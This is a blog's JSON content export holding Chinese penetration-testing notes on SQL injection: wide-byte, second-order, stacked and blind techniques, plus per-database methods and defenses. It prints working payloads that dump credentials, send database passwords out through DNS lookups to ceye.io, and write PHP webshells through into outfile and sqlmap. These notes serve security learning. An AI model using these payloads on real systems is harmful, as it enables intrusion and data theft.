{"meta":{"title":"J3fffff's Blog","subtitle":"","description":"","author":"Jeff","url":"https://j3f5.github.io","root":"/"},"pages":[{"title":"关于","date":"2023-05-22T10:48:15.513Z","updated":"2023-05-22T08:59:44.740Z","comments":false,"path":"about/index.html","permalink":"https://j3f5.github.io/about/index.html","excerpt":"","text":"个人详细介绍"},{"title":"404 Not Found：该页无法显示","date":"2023-05-22T08:59:44.739Z","updated":"2023-05-22T08:59:44.739Z","comments":false,"path":"/404.html","permalink":"https://j3f5.github.io/404.html","excerpt":"","text":""},{"title":"书单","date":"2023-05-22T10:10:32.005Z","updated":"2023-05-22T08:59:44.741Z","comments":false,"path":"books/index.html","permalink":"https://j3f5.github.io/books/index.html","excerpt":"","text":""},{"title":"分类","date":"2023-05-22T08:59:44.741Z","updated":"2023-05-22T08:59:44.741Z","comments":false,"path":"categories/index.html","permalink":"https://j3f5.github.io/categories/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2023-05-22T08:59:44.742Z","updated":"2023-05-22T08:59:44.742Z","comments":false,"path":"repository/index.html","permalink":"https://j3f5.github.io/repository/index.html","excerpt":"","text":""},{"title":"标签","date":"2023-05-22T08:59:44.743Z","updated":"2023-05-22T08:59:44.743Z","comments":false,"path":"tags/index.html","permalink":"https://j3f5.github.io/tags/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2023-05-22T08:59:44.742Z","updated":"2023-05-22T08:59:44.742Z","comments":true,"path":"links/index.html","permalink":"https://j3f5.github.io/links/index.html","excerpt":"","text":""}],"posts":[{"title":"SQL注入进阶-WAF绕过与SQLMAP工具的使用","slug":"SQL注入进阶-WAF绕过与SQLMAP工具的使用","date":"2023-05-24T06:46:22.000Z","updated":"2023-05-24T06:49:03.628Z","comments":true,"path":"articles/2023/05/24/SQL注入进阶-WAF绕过与SQLMAP工具的使用/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/24/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-WAF%E7%BB%95%E8%BF%87%E4%B8%8ESQLMAP%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"WAF绕过","categories":[],"tags":[]},{"title":"SQL注入进阶-堆叠、二次、DNS注入、各位置注入等","slug":"SQL注入进阶-堆叠、二次、DNS注入、各位置注入等","date":"2023-05-24T06:22:40.000Z","updated":"2023-05-24T06:45:46.809Z","comments":true,"path":"articles/2023/05/24/SQL注入进阶-堆叠、二次、DNS注入、各位置注入等/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/24/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%A0%86%E5%8F%A0%E3%80%81%E4%BA%8C%E6%AC%A1%E3%80%81DNS%E6%B3%A8%E5%85%A5%E3%80%81%E5%90%84%E4%BD%8D%E7%BD%AE%E6%B3%A8%E5%85%A5%E7%AD%89/","excerpt":"","text":"堆叠注入（可绕过select）用法参考advance堆叠注入就是将一堆sql语句叠加在一起执行，使用分号结束上一个语句再叠加其他语句一起执行。试想一下我们在; 结束一个 sql语句后继续构造下一条语句, 会不会一起执行？因此这个想法也就造就了堆叠注入。 与union jection(联合注入)的区别：区别就在于 union或者 union all 执行的语句类型是有限的, 可以用来执行查询语句, 而堆叠注入可以执行的是任意的语句。 但是不同的数据库有不同的注入语句。 查询时通常只返回一个结果，导致后面的SQL语句可能无法回显到页面上 例子：修改数据：select * from user_test;update user_test set name=&#39;modify&#39; where name=&#39;张三&#39;; 注：上面的介绍中我们已经提及，oracle不能使用堆叠注入，可以从图中看到，当有两条语句在同一行时，直接报错。无效字符。 宽字节注入&amp;&amp;二次编码注入&amp;&amp;二次注入宽字节注入在mysql中，用于转义（即在字符串中的符号前加上\\）的函数有addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种情况是magic_quote_gpc，不过高版本的PHP将去除这个特性（会返回false）。 意义：php gpc开启会转义单引号，导致字符注入时无法闭合单引号，宽字节注入就可以吃掉转义字符从而进行注入。 重点：%df%27 注意： 我们在之前介绍过“set names gbk”其实干了三件事，等同于：SET character set connection=&#39;gbk&#39;,haracter set results=&#39;gbk&#39;,character_set client=&#39;gbk&#39;，而这段是存在宽字节注入的，一旦其中一个不是gdk，例如最后一个character_set client=binary，那么就是不存在了。 字符集（宽）GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。 MySQL的字符集转换过程 MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection; 进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：（一级一级往上升，找到配置） 使用每个数据字段的CHARACTER SET设定值; 若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准); 若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值; 若上述值不存在，则使用character_set_server设定值。 将操作结果从内部操作字符集转换为character_set_results。 重点：宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码。 注入原理 GBK 占用两字节 ASCII占用一字节 PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\\”），MYSQL默认字符集是GBK等宽字节字符集。 大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\\，变成了 %df\\’，其中\\的十六进制是 %5C ，那么现在 %df\\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为%df%5c是一个宽字符，也就是縗，也就是说：%df\\’ = %df%5c%27=縗’（单引号逃逸），有了单引号就好注入了。 也就是本来是1(23)，其中2用来注释3，但是因为宽字节会变成(12)3，这样3就独立出来了。所以，诀窍是让(12)成为一个可以被解析的宽字符就行。 1234567$sql = &quot;select * from user where username=&#x27;$username&#x27;&quot;; payload:-1%df%27 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;table.name&#x27; # (后面的&#x27;&#x27;可以使用16进制编码，编码结束后在前面加上0x) 常见URL编码 URL编码 注释 %27 单引号 %20 空格 %23 #号 %5c /反斜杠 header改为gbk：header(&quot;Content-type:text/html;charset=gbk&quot;); 防御 使用mysql_set_charset(utf8)指定字符集 使用mysql_real_escape_string进行转义 这同样也是存在漏洞的，另外官方建议使用mysql_set_charset方式来设置编码，不幸的是它也只是调用了SET NAMES,所以效果也是一样的。不过mysql set_charset调用SET NAMES之后还记录了当前的编码，留着给后面mysql_real_escape_string处理字符串的时候使用，所以在后面只要合理地使用mysql_real_escape_string还是可以解决这个漏洞的，关于这个漏洞的解决方法推荐如下几种方法： 在执行查询之前先执行SET NAMES’gbk’,character_set_client&#x3D;-binary设置character set client binary. 使用mysql_set_charset(‘gbk’)设置编码，然后使用mysql_real_escape_string()函数被参数过滤。 使用pdo方式，在PHP5.3.6及以下版本需要设置setAttribute (PDO:ATTREMULATE_PREPARES,false);来禁用prepared statements的仿真效果。 二次编码注入二次编码注入和宽字节注入有着异曲同工之妙，都是在面对PHP代码或者配置，对输入的‘(单引号)进行转义的时候，在处理用户输入的数据时存在问题，绕开了转义。 这里不是宽字节注入的GBK编码，而是UFT-8，所以宽字节注入不管用。 重点：%2527 URL编码编码肯定是因为原始的格式并不适合传输才进行的，例如+，=，&amp;，;等符号在http请求过程中会与原有格式进行冲突，所以需要进行编码转换。 比如某登录场景：index.php?id=1$name=admin$pwd=123。账号密码中带有&#x3D;号和&amp;号，就可能导致冲突，这些就需要进行url编码比如： 编码前：name&#x3D;admin&#x3D; 编码后：name&#x3D;admin%3d 通常后端程序会自动进行解码，比如php的urldecode()函数：urldecode(&#39;%3d&#39;) 二次编码urldecode()与PHP本身处理编码时，两者配合失误，可以构造数据消灭斜线。 当输入id=1%27或者id=1’，都会被过滤（加上了\\） 当输入id=1%2527就可以让%25--&gt;%，所以合起来，就会变成%27，刚好能够注入。 二阶注入（二次注入）示例是由：创建用户，登录和修改密码组成。 当我们遇到特殊字符转义的时候（例如：mysql_real_escape_string） mysql_real_escape_string: 将转义特殊字符：\\x00, \\n, \\r, \\, &#39;, &quot;, \\x1a 当我们注册的用户名为admin&#39;#，即使转义了，但是在数据库中是存在的，可以直接调出来，修改密码的地方并没有过滤，那么我们可以进行二次注入。 $sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin &#39;#&#39; and password=&#39;$curr_pass&#39;&quot;; 好文章，待会看： ZZCMS v8.3二阶注入：https://www.freebuf.com/vuls/183360.html ZoneMinder：https://www.4hou.com/info/news/19267.html Joomla3.8.2：https://blog.csdn.net/publicStr/article/details/80261667 二次注入漏洞挖掘：https://www.secpulse.com/archives/76506.html 二阶注入研究论文：http://www.doc88.com/p-6931153563831.html DNS注入（盲注DNSlog外带） 原理：首先需要有一个可以配置的域名，比如：ceye.io，然后通过代理商设置域名 ceye.io 的 nameserver 为自己的服务器 A，然后再服务器 A 上配置好 DNS Server，这样以来所有 ceye.io 及其子域名的查询都会到 服务器 A 上，这时就能够实时地监控域名查询请求了，图示如下 原理DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，来获取信息简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息。 利用场景：在sql注入时为布尔盲注、时间盲注，注入的效率低且线程高容易被waf拦截，又或者是目标站点没有回显，我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功，且在现代WAF的防护下，很可能导致IP被ban，这时候就要用到我们的DNSlog注入。 推荐平台：dnslog, admindnslog, ceye, BulidDNS 攻击目标使用Mysql：SELECT LOAD_FILE(CONCAT(&#39;\\\\\\\\&#39;,(SELECT password FROM mysql.user WHERE user=&#39;root&#39; LIMIT 1),&#39;.mysql.ip.port.b182oj.ceye.io\\\\abc&#39;)); 前人的payload： ?id=1’ and if((select load_file(concat(’\\\\\\\\’,(select database()),’.sojcvo.ceye.io\\\\aaa’))),1,0)--+ ?id=1&#39; and if((select load_file(concat(&#39;\\\\\\\\&#39;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&#39;.sojcvo.ceye.io\\\\aaa&#39;))),1,0)--+ ?id=1&#39; and if((select load_file(concat(&#39;\\\\\\\\&#39;,(select hex(concat_ws(&#39;~&#39;,username,password)) from users limit 0,1),&#39;.sojcvo.ceye.io\\\\abc&#39;))),1,0)-- + 用 concat_ws() 函数分割，因为在 load_file() 里面不能使用 @ ~ 等符号分割，用 hex() 函数转成十六进制，出来结果了再转回去即可。 然后在ceye.io中看输出。 各位置注入 提交方式：get&#x2F;post get只有一次传输 post传输头得到100 continue后再传data 注入类型：json&#x2F;数字&#x2F;字符串 注入点： Cookie Header：User-Agent（）可能存在有数据库的交互，记录在$_SERVER中","categories":[],"tags":[]},{"title":"SQL注入进阶-各种数据库的注入方式","slug":"SQL注入进阶-各种数据库的注入方式","date":"2023-05-23T10:24:39.000Z","updated":"2023-05-24T06:20:33.400Z","comments":true,"path":"articles/2023/05/23/SQL注入进阶-各种数据库的注入方式/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/23/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/","excerpt":"","text":"介绍 什么决定网站注入点用户权限？数据库配置文件 常用数据库常见的数据库：Access，Mysql，Mssql，mongoDB，postgresql，sqlite，oracle，sybase等 这些数据库除了Access没有数据库名外，其他都类似，有：数据库名+表名+列名+数据 关系型数据库：通过外键关联来建立表与表之间的关系。由二维表及其之间的联系组成的一个数据组织。如：Oracle、DB2、MySql 非关系型数据库：通常指数据以对象的形式存储在数据库中，而对象之间的关系通过每个对象自身的属性来决定。非关系型数据库产品是传统关系型数据库的功能阉割版本，通过减少用不到或很少用的功能，来大幅度提高产品性能。如：NoSql、Cloudant。 判断sql注入数据库类型方法 如果可以，直接通过端口&#x2F;默认语言判断 默认语言搭配数据库： 组合类型asp + access&#x2F;mssql组合类型php + mysql组合类型aspx+mssql组合类型jsp +mysql&#x2F;oracle组合类型Python + MongoDB 常见数据库的默认端口： 关系型数据库mysql 3306sqlserver 1433oracle 1521psotgresql 5432 非关系型数据库MongoDB 27017Redis 6379memcached 11211 是否可以使用特定的函数来判断，该数据库特有的 在mssql中可以调用substring。oracle则只可调用substr mssql不可以调用version() 是否可以使用辅助的符号来判断，如注释符号、多语句查询符等等 /*是MySQL中的注释符，返回错误说明该注入点不是MySQL； --是Oracle和MSSQL都支持的，但是;是Oracle不支持的，因为它不支持多行查询。 是否可以编码查询 是否显可以利用错误信息 例如：错误提示Microsoft JET Database Engine 错误 ‘80040e14’，说明是通过JET引擎连接数据库，则表明数据库为ACCESS数据库，如果是ODBC的话则说明是MSSQL数据库。 是否存在数据库某些特性辅助判断 特殊表：access(msysobjects)，mssql(sysobjects)，oracle(sys.user_tables)，mysql(information_schema) 参考：https://www.jianshu.com/p/e308d96e2ecd MYSQL 常见手法 找到注入点 and 1=1 and 1=2 测试报错 order by 5 # 到5的时候报错，获取字段总数为4 id=0(不是1就行，强行报错) union select 1,2,3,4 # 联合查询，2和3可以显示信息 获取数据库信息 123user() ==&gt;rootdatabase() ==&gt;mozhe_Discuz_StormGroupversion() ==&gt;5.7.22-0ubuntu0.16.04.1 获取数据库表 12345table_name 表名information_schema.tables 系统生成信息表table_schema=数据库名16进制或者用单引号括起来# 改变limit 0,1中前一个参数，得到其他表 获取列名 脱库 信息搜集（前面提过）在mysql的5.0以上版本中，自带一个information_schema数据库名，存储数据库所有的信息，具有表schemata（数据库名）tables（表名）columns（列名字段名） 1234SCHEMA_NAME字段用来存储数据库名，TABLE_SCHEMA字段用来存储表名，table_schema和table_name分别来存储数据库名和表名information_schema.tables 记录所有的表information_schema.columns 记录所有的列 MYSQL注入中首先要明确当前注入点权限，高权限注入时有更多的攻击手法，有的能直接进行getshell操作，其中也会遇到很多的阻碍，相关防御手法也要明确，所谓知己知彼，百战不殆。作为安全开发工作者，攻防兼备。 注入点权限是否为root，取决于连接数据库的文件。这也决定了高权限注入及低权限注入。使用user()进行查看，而且需要注意的是：不是root权限获取不到数据库名。 跨库查询、文件读写以及应用思路跨库查询1234567891011# 获取所有数据库名?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata # 查表，找与网站对应的数据库名，若没有，则挨个查。或者使用 union select 1,2,database()?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = &#x27;qqyw&#x27;# 跨库查列?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name = &#x27;admin&#x27; and table_schema=&#x27;qqyw&#x27;# 查结果?id=-1 union select 1,u,p from qqyw.admin 文件读写会用到MySQL数据库里两个内置函数，这两个函数是MySQL数据库特有的，在其他数据库是没有的或者在其他数据库中写法不同，所以这是为什么说注入点分数据库的原因，因为每个数据库内置的安全机制和它的功能不同，这才导致在注入的时候针对不用的数据库采取的攻击思路也不同。MySQL有内置读取的操作函数，我们可以调用这个函数作为注入的攻击。 读取函数：load_file() 导出函数：into outfile 或into dumpfile 前提 应该设置--secure-file-priv 否则会出现如下错误，这是因为MySQL 限制了数据的导出路径。MySQL 导入导出文件只能在secure-file-priv变量的指定路径下的文件才可以导入导出。如果是NULL那就是禁止输出。而如果是空，则不限制目录。 The MySQL server is running with the –secure-file-priv option so it cannot execute this statement。 应该对web目录需要有写权限，能够使用单引号 应该知道绝对路径 读取数据库路径：@@datadir 文件读取 只能读取绝对路径的网页文件 读取数据库路径：@@datadir 将绝对路径转换为16进制数时，不需要使用引号 语句： 1and 1=2 union select 1,load_file(&#x27;C:\\\\inetpub\\\\wwwroot\\\\mysql-sql\\\\inc\\\\set_sql.php&#x27;),3,4 然后在网页源码中查看 文件导出（写入到文件） 知道路径： 1?id=1 union select &quot;&lt;?php @eval($_POST[&#x27;123&#x27;]);?&gt;&quot; into outfile(&quot;C:/phpStudy/WWW/a.php&quot; 采用PHPmyadmin，选择一个数据库如test，在数据库中新创建一个表aa，在aa中插入一个数据&lt;?php @eval($_POST[&#39;123&#39;]);?&gt; 1id=-1 union select * from aa into outfile &#x27;C:/phpStudy/WWW/a.php&#x27;; --+ 路径获取常见方法 报错显示：一般网站出现错误的时候它会泄露出路径； 遗留文件：站长为了调试信息的时候遗留的文件而泄露的路径。用扫描工具可以扫出； 漏洞报错：知道对方是用什么程序搭建再去网上去搜索漏洞信息：phpcms 爆路径； 平台配置文件：通过读取文件来读取搭建网站平台的配置文件。缺点：路径不是默认的，一旦更改很难找到路径； 爆破； 魔术引号及常见保护php.ini中存在magic_quotes_gpc选项，称为魔术引号，此选项打开，使用GET，POST，cookie所接收的&#39;单引号，&quot;双引号，\\反斜线和NULL字符全部被加上一个反斜线转义。此时，注入类型是字符型注入已经无法构成威胁。 编码或宽字节绕过 isset无法绕过，则替换关键字 宽字节绕过0XBF27是两个字符，在PHP中比如addslash和magic_quotes_gpc开启时，由于会对0x27单引号进行转义，因此0xbf27会变成0xbf5c27，而数据进入数据库中时，由于0XBF5C是一个另外的字符，因此\\转义符号会被前面的bf带着”吃掉“，单引号由此逃逸出来可以用来闭合语句 自定义关键字替换 其他绕过思路见其他文章 权限获取数据库操作权限获取提权之前需要获得高权限用户，获得高权限Mysql用户可以通过以下方法： 弱口令爆破 sqlmap注入的--sql-shell模式 进入交互界面后，通过select host,user,password from mysql.user这条命令，可以查询数据库的用户和密码。 网站的数据库配置文件中拿到明文密码信息。文件名一般都有config CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限 Webshell获取into outfile 知道网站物理路径 高权限数据库用户 load_file()开启 即 secure_file_priv 无限制 可以通过这个查：mysql&gt; show global variables like &#39;%secure_file_priv%&#39;; 值 说明 NULL 不允许导入或导出 &#x2F;tmp 只允许在&#x2F;tmp操作 空 不限制目录 在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件 在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件 网站路径有写入权限 操作 select &#39;&lt;?php phpinfo(); ?&gt;&#39; into outfile &#39;/var/www/html/info.php&#39;; 1232. ``` sqlmap -u &quot;http://x.x.x.x/?id=x&quot; --file-write=&quot;/Users/guang/Desktop/shell.php&quot; --file-dest=&quot;/var/www/html/test/shell.php&quot; 日志文件写 shell Web 文件夹宽松权限可以写入 Windows 系统下 高权限运行 MySQL 或者 Apache 日志设置查看： 12345678mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;general_loggeneral_log_file# 自定义set global general_log = &quot;ON&quot;;set global general_log_file=&#x27;/var/www/html/info.php&#x27;;# 往日志里面写入 payloadselect &#x27;&lt;?php phpinfo();?&gt;&#x27;; MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell general_log 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。 可以尝试自定义日志文件，并向日志文件里面写入内容的话，那么就可以成功 getshell： 注： 这里虽然可以成功写入，但是这个 info.php 是 MySQL 创建的 ： Apache 访问这个 php 文件会出现 HTTP 500 的状态码，结论是 root 系统这种情况基本上不会成功，只有在 Windows 系统下成功率会高一些 系统命令执行（提权【参考国光】）查询HASH解密1234# MySQL &lt;= 5.6 版本mysql&gt; select host, user, password from mysql.user;# MySQL &gt;= 5.7 版本mysql &gt; select host,user,authentication_string from mysql.user; 也可以通过 Hashcat 来手动跑字典，基本上使用 GPU 破解的话也是可以秒破解的： UDF提权反弹端口提权MOF提权启动项提权CVE-2016-6663&#x2F;6664组合拳低版本注入配合读取或暴力 小于5.0版本字典或读取，爆破 ACCESSaccess数据库保存在网站源码下面，自己网站数据库独立存在，没有文件读写的操作。 面对它只能暴力猜解，没有其他办法。 Access注入时，如果列名或者表名猜解不到的情况怎么办？ Access偏移注入：解决列名获取不到的情况。 and 1&#x3D;2 报错找到注入点 order by 获取总字段 猜解表名 and exists (select * from admin) 页面返回正常，说明存在admin表 猜解列名 and exists(select id from admin) 页面显示正常，admin表中存在id列 username,passwd 同样存在 脱库 union select 1,username,passwd,4 from admin MSSQL and 1&#x3D;2报错 order by N# 获取总字段 猜表名 and exists(select * from manage) 表名manage存在 猜解列名and exists(select id from manage)列名id存在 脱库and exists (select id from manage where id=1 )证明id&#x3D;1存在 and exists (select id from manage where%20 len(username)&#x3D;8 and id&#x3D;1 ) 猜解username字段长度为8 and exists (select id from manage where%20 len(password)&#x3D;16 and id&#x3D;1 ) 猜解password字段长度为16 可用Burp的Intruder功能辅助猜解 猜解username第1到8位的字符，ASCII转码 admin_mz 猜解password第1到16位的字符，ASCII转码(Burp 爆破) 转ASCII的py脚本： 72e1bfc3f01b7583 MD5解密为97285101 常用参数 @@version，查询当前数据库版本 db_name()，查询当前数据库名称 user,system_user,current_user,user_name，查询当前用户 IS_SRVROLEMEMBER()，查询数据库权限。 @@SERVERNAME：获取有关服务器主机的信息 SQLite 找注入点 and 1&#x3D;1 order by N 猜字段 4 猜数据库 offset &#x3D;&#x3D;&gt;0~2 有三个数据库： WSTMart_reg notice_sybase sqlite_sequence 猜列 共有3个字段： id,name,password 脱库 MongoDB id&#x3D;1′ 单引号注入报错 闭合语句，查看所有集合 查看指定集合的数据 [0] 代表第一条数据，可递增 DB2 and 1&#x3D;2 判断注入点 order by N 获取字段数 爆当前数据库：GAME_CHARACTER 列表：NAME 脱库 PostgreSQL and 1&#x3D;2 判断注入点 order by N 获取字段 爆数据库 列表 列字段 脱库 Sybase数据库 and 1&#x3D;2 判断注入点 order by N 获取总字段 爆数据库 列表 列字段 查状态：结果为：zhang 反选爆用户名：结果为：mozhe 猜解密码 Oracle and 1&#x3D;1 order by 爆数据库 列表 列字段 脱库 加上状态：1 where STATUS=1 其他小tipsoutfile 和 dumpfile的区别outfile: 支持多行数据同时导出 使用union联合查询时，要保证两侧查询的列数相同 会在换行符制表符后面追加反斜杠 会在末尾追加换行 dumpfile: 每次只能导出一行数据 不会在换行符制表符后面追加反斜杠 不会在末尾追加换行 因此，我们可以使用into dumpfile这个函数来顺利写入二进制文件；into outfile函数也可以写入二进制文件，只是追加的反斜杠会使二进制文件无法生效。如果服务器端本身的查询语句，结果有多行，但是我们又想使用dump file，应该手动添加 limit 限制。","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"SQL注入基础","slug":"SQL注入基础","date":"2023-05-23T02:29:45.000Z","updated":"2023-05-23T13:02:54.660Z","comments":true,"path":"articles/2023/05/23/SQL注入基础/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/23/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/","excerpt":"","text":"SQL注入基础 基础语法以及函数基础12345678910# 查询select * from news where id=$id# 更新update user set pwd=’$p’ where id=2 and username=‘admin’# 添加insert into users(id,url,text) values(2,‘x’,’$t’)# 删除delete from news where id=$id# order byselect id,name,price from news order by $order 其他 123456# 增加字段ALTER TABLE employees ADD phone varchar(20)# 权限控制(grant revoke)grant insert on grant_rights to unauthorized_user# 删表DROP TABLE users; 连接词、联合查询union：联合查询 1select * from table where id = 1 union order by 3 join：连接查询（right&#x2F;left join），如下搜索两个表相同的字段 1select * from users a join users b where a.id = b.id 注释以及其他符号注释： 1234/* */ are inline comments-- , # are line commentsExample: SELECT * FROM users WHERE name = &#x27;admin&#x27; -- AND pass = &#x27;pass&#x27; 对于# url中的#是用来指导浏览器动作的（例如锚点），对服务端完全无用 所以在URL中使用#进行注入时应该将它转成url编码：%23 在POST请求中就不需要（需要验证） 对于--(空格) 一般在GET请求中，空格会直接被忽略，所以需要把他转化成--%20 还有另外一种方式，就是使用--+，这时候+号会被解释成空格 为什么要加空格：因为这样可以和后面的单引号隔开，才能形成有效的payload 对于需要编码转码的#有用，因为只有一个字符，POST最好用这个，其他用--+ 堆叠查询： 123; allows query chainingExample: SELECT * FROM users; DROP TABLE users; 查询可用： 1234&#x27;,+,|| allows string concatenationChar() strings without quotesExample: SELECT * FROM users WHERE name = &#x27;+char(27) OR 1=1 注入原理以及危害对于传入的搜索内容过滤不严，导致用户可以通过拼接SQL语句，对数据库进行操作。 以下情形均可能产生漏洞： 接收数据 拼接数据 数据库执行 结果展示 他会导致如下危害： 危害数据库里的数据 直接危害网站的权限 我们可以通过以上查询方式与网站应用的关系，注入点产生地方或应用猜测到对方的 SQL 查询方式 基本注入这里以mysql注入为例子 信息搜集主要搜集： 123456789# 操作系统select @@version_compile_os# 数据库版本：select version()select @@version# 数据库名字：select database()# 数据库用户：select user() 在mysql的5.0以上版本中，自带一个information_schema数据库名，存储数据库所有的信息，具有表schemata（数据库名）tables（表名）columns（列名字段名） 1234SCHEMA_NAME字段用来存储数据库名，TABLE_SCHEMA字段用来存储表名，table_schema和table_name分别来存储数据库名和表名information_schema.tables 记录所有的表information_schema.columns 记录所有的列 小知识点： 问：一个@与两个@@有何区别？ 答：一个@是用户自定义变量，两个@是系统变量 手工注入 判断是否能注入，以及注入类型 先看是否输出信息：可以使用&#39;、&quot; 和--+来测试 输出正确、错误与报错信息：都可以 输出正确、报错但不输出错误信息：布尔&#x2F;时间盲注&#x2F;报错注入 输出正确但不输出报错和错误信息：布尔&#x2F;时间盲注 不输出任何信息：时间盲注 12# 或 且 非 三种逻辑判断符id=-1&#x27; and 1=1 判断有几个注入点：id=1&#39; order by 3--+ 判断输出点有几个是可以回显的：id=1&#39; union select 1,2,3 --+ 信息搜集： 获取数据库: 获取此时的数据库：id=-1&#39; union select 1,2,database() --+ 获取全部数据库：id=-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata --+ 获取表名:id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+ 查询其他数据库表名把database()换成&#39;you_want&#39; 获取列名：id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;you_want --+&#39; 数据获取： 获取单个：id=-1&#39; union select 1,2,[columnname] from [tablename] --+&#39; 获取全部： id=-1&#39; union select 1,2,group_concat([allcolumnname]) from [tablename]--+ -1&#39; union select 1,2,(select concat_ws([column_name]) from [tbname]) --+ 闭合常用闭合 1234567or 1=1--+ （数字型）&#x27; or 1=1--+ （字符型）&quot; or 1=1--+ （字符型）) or 1=1--+ （MySQL是允许嵌入多个括号的）&#x27;) or 1=1--+&quot;) or 1=1--+&quot;)) or 1=1--+ 非注释闭合 1234|| &#x27;or &#x27;&amp;&amp; &#x27;1&#x27;=&#x27;1;%00 报错and盲注盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类： 基于布尔的 SQL 盲注-逻辑判断：regexp，like，ascii，left，ord，mid 基于时间的 SQL 盲注-延时判断：if，sleep 基于报错的 SQL 盲注-报错回显：floor，updatexml，extractvalue 对于报错注入，其payload可以安排在如下位置： 1234567&#x27;or（有效载荷）or&#x27;&#x27;and（有效载荷）and&#x27;&#x27;or（有效载荷）and&#x27;&#x27;or（有效载荷）and&#x27;=&#x27;&#x27;*（有效载荷）*&#x27;&#x27;or（有效载荷）and&#x27;“ - （有效载荷） - “ 参考： 123456789like ‘ro%’ #判断ro或ro…是否成立regexp ‘^xiaodi[1-z]’ #匹配xiaodi及xiaodi…等if(条件,5,0) #条件成立，返回5，反之，返回0sleep(5) #SQL语句延时执行5秒mid(a,b,c) #从位置b开始，截取a字符串的c位substr(a,b,c) #从B位置开始，截取字符串a的c长度left(database(),1),database() #left(a,b)从左侧截取a的前b位length(database())=8 #判断数据库database()名的长度ord=ascii ascii(x)=97 #判断x的ascii码是否等于97 涉及资源： 12种报错注入+万能语句 Order by排序注入方法小总结 Insert update语句：insert into user(username,password) values(&#39;$username&#39;,&#39;$password&#39;,) floor：username=lwx’ or(select 1 from(select count(*),concat((select(select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#39; updatexml：username=lwx’ or updatexml(1,concat(0x7e,(version())),0) or &#39; extractvalue：username=lwx’ or extractvalue(1,concat(0x7e,database())) or &#39; delete在get中需要使用+号或者%20把语句连接起来，避免出错 floor：GET /pikachu-master/vul/sqli/sqli_del.php?id=57+or+(select+1+from(select+count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x+from+information_schema.character_sets+group+by+x)a) HTTP/1.1 updatexml：GET /pikachu-master/vul/sqli/sqli_del.php?id=57+or+updatexml+(1,concat(0x7e,database()),0) extractvalue：GET /pikachu-master/vul/sqli/sqli_del.php?id=57+or+extractvalue(1,concat(0x7e,database())) HTTP/1.1 布尔与延时盲注布尔盲注 id=1&#39; and left(version(),1)=5 --+ id=1&#39; and length(database())=8--+ 延时盲注 id=1 and if((length(database()=8)),sleep(5),1)--+ id=1 and if(ascii(substr(database(),1,1))=115,sleep(5),1) --+ 防御SQL注入需要分清各种防御针对的对象是谁。 SQL语句的执行代码使用预编译 PreparedStatement 。 确定每个数据的类型，比如是数字，数据库则必须使用int类型来存储。(这个是用来防什么的？) 限制传入数据的长度，这能够在一定程度上防止sql注入。 严格限制用户使用数据库的权限，能够在一定程度上减少sql注入的危害。 避免直接响应一些 sql 语句执行异常的信息。 过滤参数中含有的一些数据库关键词。 其他基础概念 实例名：数据库实例名是用于和操作系统进行联系的标识,就是说数据库和操作系统之间的交互用的是数据库实例名 